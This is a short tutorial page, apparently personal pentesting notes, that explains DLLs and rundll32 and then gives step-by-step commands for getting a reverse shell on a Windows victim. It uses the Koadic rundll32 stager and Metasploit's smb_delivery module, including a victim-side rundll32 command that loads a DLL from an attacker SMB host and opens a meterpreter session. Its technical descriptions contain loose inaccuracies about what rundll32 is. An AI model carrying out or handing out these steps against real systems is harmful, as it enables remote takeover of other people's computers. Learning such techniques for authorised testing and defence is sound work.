---
title: "[04] DLL"
date: 2026-10-26
authors:
  - Prasanna
draft: false
---

{{< meta >}}

#### What is a DLL ?
DLL is known as Dynamic Link Library which provides most of the operating systems functionality. Lets, understand it in a simpler way. If you want to use a new font in notepad you should have the new font installed in your computer, similarly when any program runs in a windows computer it needs the supporting libraries to function properly which in this case is DLL files. You might have experienced errors such as DLL file missing, which we call it as a dependency issue, this happens when the required library file is not available for a process to run.
#### What is a RunDLL32 ?
Run Time DLL loads the required libraries during a runtime rather than importing all the DLL’s while a program is starting. Rundll32 is a 32 bit runtime DLL that can be loaded while a program is running, this is convenient for an attacker since they will be able to inject a malicious library function to obtain a reverse shell.
#### Reverse shell using Rundll32:
Given that we will be able to load malicious libraries into the victims device, an attacker will be able to obtain a reverse shell using various methods, we will explore a couple methods in this scenario,
- Koadic Framework
- Metasploit Framework

#### Reverse shell using Koadic Framework:
Make sure that you have koadic framework installed into your penetration testing distribution.

##### STEP 1: Move into the Koadic framework folder & Run koadic
```bash
$ ./koadic
```
##### STEP 2: Choose the Rundll32 stager from the framework
```bash
$ use stager/js/rundll32_js
$ set SRVHOST <Attacker_IP>
$ run
```
##### STEP 3: Call the malicious java script produced by the koadic framework from the victims device.
```bash
$ Malicious Script produced by Kodiac Framework
```
![](/docs/03_techniques/assets/Pasted_image_20261122002301.png)
  
##### STEP 4: Interact with the infected host from the console
```bash
$ zombies 0
```

#### Reverse shell using Metasploit Framework:
##### STEP 1: Run the metasploit framework console and use smb_delivery module
```bash
$ msfconsole
$ use exploit/windows/smb/smb_delivery
$ options
$ set SRVHOST 10.0.2.4
$ run
```
![](/docs/03_techniques/assets/Pasted_image_20261122002233.png)  
##### STEP 2: Copy the command produced by metasploit and run it in the victims device.
```bash
$ rundll32.exe [\\10.0.2.4\HJXb\test.dll,0](file://10.0.2.4/HJXb/test.dll,0)
```
##### STEP 3: We can observe that a new meterpreter session has been spawned.
```bash
$ sessions -i 1
$ sysinfo
```
![](/docs/03_techniques/assets/Pasted_image_20261122002211.png)
